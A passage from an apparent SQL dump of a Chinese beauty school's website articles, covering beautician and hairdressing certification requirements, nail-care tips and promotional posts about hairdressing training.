18px;\">技能要求采取实际操作考核和成品考评。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">考核题目结构为：操作项目，操作时间，操作要求，使用设备、工具、原材料，评分标准等。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">· 考核场地及设备要求</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">考核设备需要奥桑喷雾机、多功能美容机（高周波电疗、阴阳电离子、真空吸、健胸、减肥）、纹眉机、镜台、美容床、美容椅、化妆椅、电源、上下水、照明</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">【中级美容师】</span></strong></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">◆申报条件</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（一）在本工种连续工作4年以上；20岁及以上可以考</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（二）取得本工种初级《技术等级证书》后，在本工种工作3年以上；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（三）取得本工种初级《技术等级证书》后，经正规中级美容师技能培训，取得毕（结）业证书。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">具备上述条件之一，可申报中级美容师职业技能鉴定。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">◆鉴定方式</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">按照标准参照型要求考核（也称水平考核）。知识要求和心智技能考核采取闭卷笔试。题型及配分比例为：填空题30%，是非判断题20%，选择题20%，简答题10%，论述题10%，素描绘画题10%</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">技能要求采取实际操作考核和成品考评.</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">考核题目结构为：操作项目，操作时间，使用设备、工具、原材料，评分标准等。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">◆考核场地及设备要求</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">考核设备需要奥桑喷雾机、多功能美容机（高周波电疗、阴阳电离子、真空吸、健胸、减肥）、纹眉机、镜台、美容床、美容椅、化妆椅、电源、上下水、照明</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">【高级美容师】</span></strong></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">◆申报条件</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（一）在本工种连续工作6年以上，22岁及以上可以考</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（二）取得本工种中级《技术等级证书》后，在本工种工作5年以上；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">（三）取得本工种中级《技术等级证书》后，经正规高级美容师技能培训，取得毕（结）业证书。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">具备上述条件之一，可申报高级美容师职业技能鉴定。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">◆鉴定方式</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">按照标准参照型要求考核（也称水平考核）。知识要求和心智技能考核采取闭卷笔试。题型及配分比例为：填空题20%，是非判断题20%，选择题20%，素描题20%或色彩绘画题20%，问答题10%，综合分析题10%。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">技能要求采取实际操作考核和成品考评。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">考核题目结构为：操作项目，操作时间，操作要求，使用的设备、工具、原材料，评分标准等</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">◆考核场地及设备要求</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">·常用美容仪器、减肥机、镜台、美容床、美容椅、化妆椅、电源</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">职业资格证书的权威</span></strong></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">1</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">唯一官方证书：中华人民共和国</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">唯一官方认可的职业类证书；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">2</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">通用</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">中国职业类从业证书</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">3</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">创业就业必须</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">1、从事个体工商经营，要取得职业资格证书后工商部门</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">才办理开业手续</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">2、职业类行业就业需要到证件</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">&nbsp;</span></p><p><br/></p><p><br/></p>','','','219.147.98.86'),(57,12,'<p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">美发资格证书考试要点：</span></strong></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">基础知识<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">1</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">服务业务技术管理知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">美发岗位责任、服务规范要求及各项规章制度、服务质量标准和技术管理制度。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">公共关系基本知识<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">2</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">美发行业卫生知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">店容店貌及室内、外环境卫生知识；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">个人卫生知识及仪表、着装有关要求</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">3</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">脸形、头形及身材知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">脸形的分类及特征；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">头形及身材的分类和特征；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">发形结构 ( 发式分类、发式基本结构、发型构成要素 )</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">4</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">按摩基本知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">按摩对人体的一般保健作用；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">按摩用具、用品的使用方法；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">人体头、颈、肩、背等部位体表标志知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">人体头、颈、肩、背的经络、穴位名称、准确位置和保健作用</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">5</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">美发工具、用品及电器设备知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">美发工具、用品的种类、性能和用途；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">美发电器、仪器设备；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">美发工具及电器、仪器的维护保养知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">6</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">美发化学用品知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">洗发剂、护发剂、固发剂、护理剂等用品的主要种类和作用；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">烫发剂、漂发剂、染发剂的性能和作用；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">鉴别美发化学用品质量常识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">7</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">色彩知识</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">色彩构成原理；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">色彩功能；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">调配色彩基本常识；</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">色调选择方法</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\"><br/></span></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190302/1551523101100745.jpg\" alt=\"1551523101100745.jpg\"/></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\"><strong>美发资格证书申报条件：</strong></span></p><p><br/></p><p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">初级发型师</span></strong></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">——初级(具备以下条件之一者)&nbsp;<br/>(1)经本职业初级正规培训达规定标准学时数，并取得结业证书。&nbsp;<br/>(2)在本职业连续见习工作2年以上。&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(3)本职业学徒期满</span></p><p><br/></p><p><br/></p><p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">中级发型师</span></strong></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">——中级 ( 具备以下条件之一者 )&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(1) 取得本职业初级职业资格证书后，经本职业正规培训达规定标准学时数，并取得结业证书。&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(2) 取得本职业初级职业资格证书后，连续从事本职业工作。&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(3) 连续从事本职业工作 5 年以上。&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(4) 取得经人力资源和社会保障行政部门审核认定的、以中级技能为培养目标的中等 及以上职业学校本职业（专业）毕业证</span></p><p><br/></p><p></p><p><strong><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">高级发型师</span></strong></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">——高级 ( 具备以下条件之一者 )&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(1) 取得本职业中级职业资格证书后，连续从事本职业工作 2 年以上，经本职业正规培训达规定标准学时数，并取得结业证书。&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(2) 取得本职业中级职业资格证书后，连续从事本职业工作 3 年以上。&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(3) 取得高级技工学校或经人力资源和社会保障行政部门审核认定的、以高级技能为培养目标的高等职业学校本职业（专业）毕业证书&nbsp;<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;\">(4) 取得本职业中级职业资格证书的大专及以上本专业或相关专业毕业生，连续从事 本职业工作 2 年以上</span></p><p><br/></p>','','','219.147.98.86'),(58,23,'<p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">&nbsp; &nbsp;美甲小知识一</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　指甲油的选色原则</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　亚洲人普遍都是比较偏黄的肤色，所以要谨慎选择灰<span style=\"font-size: 16px; font-family: 黑体, SimHei;\">色和黄色系的甲油，因为这样会使皮肤变得更加暗淡。</span></span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　如果你是成熟端庄的女性，不妨选用纯白和银色的甲油做成法式美甲，会给人一种典雅、秀美的感觉。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　金色、红色、紫色等颜色具有比较厚重的华贵质感，在出席一些重要晚宴和社交活动时，可以选择这样的颜色来搭配华丽的晚礼服，会让你更加夺目耀眼。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　上班族或者学生族应该选择稳重、自然的颜色，比如裸粉色、浅粉色。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　美甲小知识二</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　如何让甲油更持久?</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　首先在美甲前，你要把指甲边缘的死皮处理好，把甲面的油份清洁干净。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　甲油涂抹时至少要两遍，并且记得把指甲前缘也要进行包边涂刷。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　最后，涂完颜色甲油以后，再涂上一层透明护甲油。这样，就可以尽量使甲油保持的时间更长久了。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　美甲小知识三</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　如何避免甲油色素沉积</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　第一，涂指甲油之前一定要用护甲油打底隔离。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　第二，要选用高品质的指甲油。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　第三，指甲油最好让他自行脱落或者随指甲长长后剪掉，尽量少用洗甲水。(虽然一些洗甲水对指甲的伤害会很小了，但是不用是最好的)</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　第四，如果已经有了色素沉淀，你应该保持一段时间不涂指甲油，这样它会自己慢慢退掉。这段时间内可以经常擦一些护甲油，会有很大的帮助。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　安利：推荐大家尝试一下水性指甲油，卸除用医用酒精或者直接一剥即可，非常安全环保，不伤指甲</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　美甲小知识四</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　平时如何保养指甲?</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　定期修剪指甲长度：用指甲刀剪短或者用美甲专用砂条修磨长短。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　然后清理死皮屑：首先应该让手指泡在温水内(可以在水中放置几片新鲜的柠檬片，使甲缝中的污垢浸出让甲皮变软)。擦干双手后。用桔木棒轻轻推动软皮，再用死皮剪或者死皮叉清除指甲周边多余的软皮屑，最后用指甲刷将指甲周围清理干净。然后将手指浸入水盆中，边刷边冲洗干净。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　涂抹润肤油霜：擦干双手后，涂抹润肤油霜，用手指旋转法反复按摩2分钟至吸收，最后用棉花蘸取酒精将甲面和甲缝里多余的油份擦拭干净即可。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　美甲小知识五</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　艺术美甲的分类</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　指甲彩绘，用专用美甲彩绘笔，蘸取颜料或甲油，在甲面上绘制图案。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　指甲雕花绘，专用的美甲雕花材料，在指甲表面制作各种立体装饰图案。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　指甲喷绘，用喷绘机和专用喷绘颜料，在甲面上喷出各种效果的图案。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　贴片甲，是用指甲专用的胶水，将全贴或半贴甲片贴在指甲表面，从而快速变为修长甲形，缺点就是稍感厚重。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　仿真甲，用仿真美甲材料(如光疗胶、水晶甲脂)，在自然真甲上进行塑型制作，弥补真甲甲型的不足之处，从而达到美化和矫正指甲的效果。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　美甲小知识六</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　如何选择适合的指甲形状</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　方形甲：一般来说，方形指甲比较个性时尚，而且不易断裂，深受职业女性和白领们的喜欢。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　方圆形指甲：给人以柔和的感觉，方圆形的指甲前端和侧面都是直的，棱角的地方成圆弧形轮廓。对于骨节明显，手指瘦长的女性，方圆形可以弥补手形的不足之处。</span></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　椭圆形指甲：椭圆形的指甲从游离缘开始，到指甲前端的轮廓呈椭圆形，是传统的东方人甲形。</span></p><p><br/></p><p><span style=\"font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">　　尖形指甲：前卫小众的一种甲型。尖形指甲由于接触面积小，比较容易断裂，而且亚洲人的甲形较薄，不适合修成这种甲形。</span></p><p><br/></p>','','','219.147.98.86'),(60,16,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551883555262981.jpg\" style=\"\" title=\"1551883555262981.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551883556854012.jpg\" style=\"\" title=\"1551883556854012.jpg\"/></p><p style=\"text-align: center;\"><br/></p>','','','219.147.98.86'),(61,11,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">进入美发行业并不像大家想象的那么困难，如果我们能找到一个正规的学校学习，那么就能在短时间内掌握一定的美发技能，掌握技能后就有了开店吸引客户前来的基础。在学习美发时，大家肯定首先想了解一般学美发需要多长时间？其实，对于美发而言，学习是一个不断进行并不断提升自己的过程，美发从业者需要不断的仅需来提升自己的能力和审美标准，及时了解当下的潮流，这样才能给顾客带来等好的服务和体验，下面我们就一起来了解一下学习美发需要多长时间吧。</span></p><p style=\"text-align:center\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><img src=\"/uploads/allimg/20190303/1551600819194069.jpg\" title=\"1551600819194069.jpg\" alt=\"1 (7).jpg\"/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">首先大家肯定想到自己的基础问题，其实对于老师而言，他们更喜欢零基础的学生，因为这样教学的过程中能够更好的接受老师所教的内容，容易养成良好的习惯。其次想到的肯定是学习时间长短的问题，大家一定不要相信那些一到两个月就能掌握大量美发技巧技能，能够独立开店的学校宣传。美发不仅仅是技术的学习还有理论知识的学习，审美观的养成等等，不可能在短时间内达成学习目标。那些快速学成的美发学校往往注重的是理论知识的教学，纸上谈兵对美发行业而言无疑是最大的缺陷。美发行业是一个技术性很强的行业，随便学习几招根本不能满足客人日益增长的审美需求，没有专业的技术和良好的审美是不会有客户愿意选择你的。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">专业的技术、紧跟时代潮流的审美、及时掌握第一手潮流资讯都是美发行业必备的内容，而这些模块的学习对学校的要求也是很高的，因此一定要选具备完善的教学体系、拥有优质的教师资源、掌握大量美发信息的学校。好的学校会合理安排所有课程，让学员在最短的时间内学到所有知识，好的学校不仅教会你一门技术，还会帮你寻找符合自己的发展之路。</span></p><p><br/></p>','','','219.147.98.86'),(62,11,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">随着经济的发展和生活水平的提高，人们对生活水平质量要求越来越高，越来越愿意花钱在变美这个领域。无论男女都越来越愿意花大量的时间和金钱在美容美发上。而且无论在哪个城市，随处都可见各种各样的美发店，说明人们对美发的需求也越来越大，一个好的理发店往往拥有大量稳定的客源，学美发前景好吗？答案是肯定的，美发的前景十分广阔，学美发不仅能为你积累财富，在拥有大量优质客源后，还能帮助你拓宽人脉，可谓是一举多得。</span></p><p><br/></p><p style=\"text-align:center\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><img src=\"/uploads/allimg/20190303/1551600886833691.jpg\" title=\"1551600886833691.jpg\" alt=\"1 (4).jpg\"/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">学习美发创造美好的明天</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">大家经常能听到或看到各种对美发行业的段子，或听到身边人对美发师的抱怨，可见在美发行业，素质是参差不齐的，技能也存在很大差异，在现代好的美发师往往是可遇而不可求的。一个技能过硬的美发师不仅能为顾客打理出一款漂亮的发型，还能通过理发师的巧手改变一个人的气质、修饰脸型，打造出意想不到的效果。这也就是为什么爱美人士屡战屡败后仍坚持不懈的原因，如果我们能通过正规的美发学校学习完善高端的美发技术的话，那么在后续的工作或创业中可以预见门庭若市的场面，大量优质的客源不断地积累，也是在不断额给自己积累财富。</span></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">掌握专业技巧提升审美能力</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">学习美发不仅仅是学习如何剪头发，还是不断提升自己专业技能体系，提高自己的综合能力，使自己能够紧跟时代的潮流。人们花大量的财力和物力在美容美发上就是为了是自己能变得越来越漂亮，能够得到来自身边人的夸赞，但如果你的美发技巧和审美不能紧跟潮流，顾客也会因为你的专业程度不够、审美差而远离你。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">专业的学校带你提升专业技能</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">高超的技巧和紧跟潮流的审美观，是你走进美发行业的敲门砖，更是你拓展财富之路的重要技能。学美发前景好吗？在了解了美发行业的前景后，你是不是跃跃欲试了呢？是不是也想学习高超的理发技巧呢？是不是想提升自己的综合素质呢？来环球美容美发学校吧，在提高自己专业技能的同时，还能获得创业和工作支持，获得与各领域的专业大神切磋的机会。</span></p><p><br/></p>','','','219.147.98.86'),(63,11,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">在发布了很多的美发发型的文章后，很多小伙伴说都私信说，老师，每次发的潮流发型，我们都想剪，可是到了发型师手里，想要的和剪出来不是一个画风啊，对于这个问题呢，今天我们就来和美发学校的小编了解一下怎么样才能做一款自己心目中理想的发型。</span></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;</span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551600974214571.jpg\" title=\"1551600974214571.jpg\" alt=\"2 (5).jpg\"/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">一、随着网络的发展，很多网红博主都在自己的微博呀，微信呀等等一系列的网络平台，发布自己的发型搭配或者是一些时尚的搭配技巧，这让很多同学都开阔了自己的眼界。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">但是要知道每个网红的街拍，都是在时尚界摸爬滚打了好多年，看似一个轻松随意自然的发型，都是不断尝试才找到适合自己的风格，而且越是自然的发型对于发型师的技术要求是很高的，而且步骤也是比较的繁琐的，因此，我们在选择适合自己发型的时候，要考虑一下自己的颜值哦，要不然就会成为买家秀和卖家秀的对比照哦</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 